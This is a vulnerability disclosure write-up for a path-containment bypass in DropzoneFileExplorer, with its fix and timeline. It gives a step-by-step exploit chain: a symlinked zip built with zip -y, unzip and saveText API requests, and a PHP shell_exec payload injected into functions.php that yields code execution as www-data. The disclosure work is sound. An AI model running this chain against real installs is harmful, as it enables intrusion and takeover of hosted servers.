---
title: "Root containment check skips admin accounts, allowing authenticated RCE via zipped symlink"
target: "KeepCoolCH/DropzoneFileExplorer"
target_url: "https://github.com/KeepCoolCH/DropzoneFileExplorer"
bug_class: "Path traversal, link following and code injection (CWE-22, CWE-59, CWE-94)"
severity: "High / authenticated RCE"
cvss: "7.2"
cvss_version: "3.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
cwe: ["CWE-22", "CWE-59", "CWE-94"]
discovery_method: "Black-box testing against a local install, then source review to confirm the cause"
disclosed: 2026-09-23
status: "published"
advisory_url: "https://github.com/KeepCoolCH/DropzoneFileExplorer/security/advisories/GHSA-5347-8mx3-j3xw"
ghsa: "GHSA-5347-8mx3-j3xw"
ghsa_url: "https://github.com/KeepCoolCH/DropzoneFileExplorer/security/advisories/GHSA-5347-8mx3-j3xw"
cve_status: "requested by the maintainer, 2026-09-25"
affected: "< V.1.3"
patched_in: "V.1.4"
credit: "Credited as reporter on GHSA-5347-8mx3-j3xw"
summary: "One early return in the path containment check exempts admins from it entirely. A zipped symlink turns that into writing code into the application's own source, and shell execution as www-data."
tags: ["web", "PHP", "path-traversal", "rce"]
featured: true
---

## Summary

DropzoneFileExplorer keeps every account inside a configured root folder. The function
that enforces that is `ensure_inside_allowed_roots` in `inc/functions.php`, and its
first line is this:

```php
function ensure_inside_allowed_roots(string $abs): void {
  if (auth_is_admin()) return;
```

Admins skip the check. Not a weakened version of it, the whole thing.

That turns into remote code execution because the app also extracts zip archives
without checking what kind of entry it is extracting.

## Why an admin escaping the folder is a real boundary

The obvious objection is that an admin is already trusted, so who cares. The app's
own design is the answer to that.

This is self-hosted software, which usually means the person running it is not the
person who owns the box. A hosting provider runs it for a client. An IT team gives a
department head admin over their own area. The entire job of the configured root
folder is to hold those admins inside it. An admin who steps out of it and writes
anywhere `www-data` can reach has crossed a line the product exists to draw.

That framing went into the report on purpose, ahead of the technical steps, because
without it this reads like a feature.

## The chain

**1. Build the symlink.** On my own machine, not the target:

```
ln -s ../html/inc/functions.php evil_func.php
zip -y evil_func.zip evil_func.php
```

`-y` is the whole trick. Without it `zip` follows the link and stores a copy of the
file. With it, the archive stores the link itself.

**2. Upload it** through the normal chunked upload path. Nothing clever here, the
symlink target sits in plain text inside the zip entry.

**3. Extract it** through the app:

```
POST /index.php?api=1&action=unzip
{"path":"evil_func.zip","dest":"","policy":"ask"}
```

The unzip handler validates entry *names* and never entry *type*, so it happily
creates a symlink on disk inside the files folder. The directory listing afterwards
shows `evil_func.php` at 74246 bytes, the size of the real `functions.php`. The app is
already following the link.

**4. Write through it** with `saveText`, putting one line above the entire original
file:

```
POST /index.php?api=1&action=saveText
{"path":"evil_func.php","text":"<?php echo \"SHELL ID: \" . shell_exec('id') . \"\\n\"; ?>\n[original functions.php follows unchanged]"}
```

**5. Trigger it.** `functions.php` is included on every request, so any request at all
runs the injected line:

```
HTTP/1.1 200 OK
SHELL ID: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## The control test

The same chain through an unauthenticated share link is refused with
`path outside root`. That is what proves the bypass is specifically the admin early
return and not some general weakness in path handling. A finding that only shows the
thing working is half a finding; the half that matters is showing it stop working when
you remove the one condition you are blaming.

## The fix

Delete the early return:

```php
if (auth_is_admin()) return;
```

The containment check then runs for every account regardless of role. That is what
shipped in V.1.4.

## Timeline

- 2026-09-23 reported privately through GitHub Security Advisories
- 2026-09-25 advisory published as GHSA-5347-8mx3-j3xw, High, CVSS 7.2
- 2026-09-25 maintainer requested a CVE through GitHub
